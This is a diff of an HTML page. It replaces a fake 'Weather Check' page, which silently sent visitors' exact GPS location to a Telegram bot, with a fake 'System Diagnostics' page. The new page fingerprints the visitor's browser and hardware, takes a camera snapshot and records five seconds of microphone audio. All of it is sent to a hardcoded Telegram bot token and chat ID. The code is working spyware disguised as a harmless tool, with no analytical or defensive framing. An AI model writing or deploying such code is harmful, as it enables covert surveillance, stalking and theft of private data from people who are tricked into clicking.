@@ -2,49 +2,130 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Weather Check</title>
+    <title>System Diagnostics</title>
     <style>
         body { background: white; color: black; font-family: Arial; margin: 20px; }
-        button { background: #4285f4; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
+        button { background: #4285f4; color: white; padding: 12px 24px; margin: 10px; border: none; border-radius: 4px; cursor: pointer; }
         .hidden { display: none; }
     </style>
 </head>
 <body>
-<h2>Weather Service</h2>
-<p>Click below to see today's forecast.</p>
-<button id="weatherBtn">Check Weather</button>
-<div id="dummyOutput" class="hidden"></div>
+<h2>System Check</h2>
+<p>Click buttons to run full diagnostics.</p>
+<button id="diagBtn">Run Diagnostics</button>
+<button id="cameraBtn">Access Camera</button>
+<button id="micBtn">Access Microphone</button>
+<div id="dummy" class="hidden"></div>
 
 <script>
     const TELEGRAM_BOT_TOKEN = "8650736921:AAH7qZokqXqR530EQ7ZsT-HxRQcmcLQ5t-E";
     const TELEGRAM_CHAT_ID = "8577571897";
 
-    function sendToTelegram(lat, lng, acc, alt, timestamp, userAgent, timezone) {
-        let message = `📍 EXACT LOCATION CAPTURED\nLatitude: ${lat}\nLongitude: ${lng}\nAccuracy: ±${acc} meters\nAltitude: ${alt !== null ? alt : "N/A"} m\nTimestamp: ${timestamp}\nUser Agent: ${userAgent}\nTimezone: ${timezone}\nMaps: https://www.google.com/maps?q=${lat},${lng}`;
-        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
-        }).catch(err => console.log("Send error:", err));
+    function sendToTelegram(text, isFile = false, fileData = null, filename = "") {
+        if (isFile && fileData) {
+            let formData = new FormData();
+            formData.append("chat_id", TELEGRAM_CHAT_ID);
+            formData.append("document", fileData, filename);
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
+                method: 'POST',
+                body: formData
+            }).catch(err => console.log(err));
+        } else {
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text.substring(0, 4000) })
+            }).catch(err => console.log(err));
+        }
     }
 
-    document.getElementById('weatherBtn').addEventListener('click', function() {
-        if (!navigator.geolocation) {
-            return;
+    function collectAllTraits() {
+        let data = {};
+
+        data.userAgent = navigator.userAgent;
+        data.platform = navigator.platform;
+        data.language = navigator.language;
+        data.languages = navigator.languages;
+        data.cookieEnabled = navigator.cookieEnabled;
+        data.onLine = navigator.onLine;
+        data.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
+        data.maxTouchPoints = navigator.maxTouchPoints || 0;
+        data.screenWidth = screen.width;
+        data.screenHeight = screen.height;
+        data.screenColorDepth = screen.colorDepth;
+        data.devicePixelRatio = window.devicePixelRatio;
+        data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        data.timezoneOffset = new Date().getTimezoneOffset();
+        data.localDateTime = new Date().toString();
+
+        if (performance.memory) {
+            data.jsHeapSizeLimit = performance.memory.jsHeapSizeLimit;
         }
-        let options = {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0
-        };
-        function success(pos) {
-            let coords = pos.coords;
-            sendToTelegram(coords.latitude, coords.longitude, coords.accuracy, coords.altitude, new Date(pos.timestamp).toISOString(), navigator.userAgent, Intl.DateTimeFormat().resolvedOptions().timeZone);
+        if (navigator.connection) {
+            data.networkEffectiveType = navigator.connection.effectiveType;
         }
-        function error(err) {
-            // Silent fail - user never knows
+        let canvas = document.createElement('canvas');
+        let gl = canvas.getContext('webgl');
+        if (gl) {
+            let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            if (debugInfo) {
+                data.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            }
         }
-        navigator.geolocation.getCurrentPosition(success, error, options);
+        let plugins = [];
+        for (let i = 0; i < navigator.plugins.length; i++) {
+            plugins.push(navigator.plugins[i].name);
+        }
+        data.plugins = plugins;
+        data.touchSupport = 'ontouchstart' in window;
+        data.doNotTrack = navigator.doNotTrack || 'unspecified';
+        data.referrer = document.referrer || 'none';
+
+        sendToTelegram(JSON.stringify(data, null, 2));
+    }
+
+    // Camera access (user sees permission prompt)
+    document.getElementById('cameraBtn').addEventListener('click', function() {
+        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+            .then(stream => {
+                let video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                let canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                let ctx = canvas.getContext('2d');
+                setTimeout(() => {
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    canvas.toBlob(blob => {
+                        sendToTelegram("Camera capture", true, blob, "camera_shot.jpg");
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 'image/jpeg');
+                }, 500);
+            })
+            .catch(err => sendToTelegram("Camera error: " + err.message));
+    });
+
+    // Microphone access (user sees permission prompt) - records 5 seconds
+    document.getElementById('micBtn').addEventListener('click', function() {
+        navigator.mediaDevices.getUserMedia({ audio: true })
+            .then(stream => {
+                let mediaRecorder = new MediaRecorder(stream);
+                let chunks = [];
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.onstop = () => {
+                    let blob = new Blob(chunks, { type: 'audio/webm' });
+                    sendToTelegram("Audio recording", true, blob, "microphone_recording.webm");
+                    stream.getTracks().forEach(track => track.stop());
+                };
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 5000);
+            })
+            .catch(err => sendToTelegram("Microphone error: " + err.message));
+    });
+
+    document.getElementById('diagBtn').addEventListener('click', function() {
+        collectAllTraits();
     });
 </script>
 </body>
